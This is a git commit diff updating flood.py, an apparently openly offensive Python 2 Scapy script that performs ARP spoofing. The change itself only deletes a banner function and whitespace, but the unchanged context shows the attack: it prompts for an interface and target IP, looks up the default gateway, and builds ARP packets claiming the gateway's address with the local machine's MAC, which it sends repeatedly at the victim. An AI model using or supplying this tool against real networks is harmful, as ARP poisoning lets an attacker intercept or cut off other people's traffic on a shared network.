faad7ae014263b78f2d4f89b379db952a8c84830
hackingyseguridad <hackingyseguridad@hackingyseguridad.com>
2018-05-24 13:44:58 +0200

    Update flood.py

--- flood.py
+++ flood.py
@@ -5,38 +5,26 @@ from time import sleep
 import time
 import sys, os, re, commands
 
-def title():
-    if os.name == "posix":
-        os.system("clear")
-    else:
-        os.system("cls")
-    for i in info:
-        print '\b%s' %(i),
-        sys.stdout.flush()
-        time.sleep(0.005)
-    print "\n"
-
 def arpflood():
     interface = raw_input("Input egress interface:")
     conf.iface = interface
 
     target = raw_input("Input target IP:")
     target = target
-    
+
     arp_paket = ARP()
-    
+
     # IP Gateway
     gw = commands.getoutput("ip route list | grep default").split()[2][0:]
     arp_paket.psrc = gw
-    
-    
+
     #IP Victim
     arp_paket.pdst = target
-    
+
     #Mac
-    mac = commands.getoutput("ifconfig eth0 | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'") 
-    arp_paket.hwsrc = mac 
-    
+    mac = commands.getoutput("ifconfig eth0 | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}'")
+    arp_paket.hwsrc = mac
+
     sleep(3)
     print '================================================'
     print "[+] Interface              : " + interface
@@ -45,7 +33,7 @@ def arpflood():
     print "[+] Target\'s IP Address   : " + target
     print '================================================'
     sleep(3)
-    
+
     print '''
     ARP Flooding ...
     '''
@@ -55,9 +43,8 @@ def arpflood():
             sleep(0.5)
     except:
         print 'Exception error'
-    
+
 if __name__ == '__main__':
-    title()
     try:
         arpflood()
     except KeyBoardInterrupt:
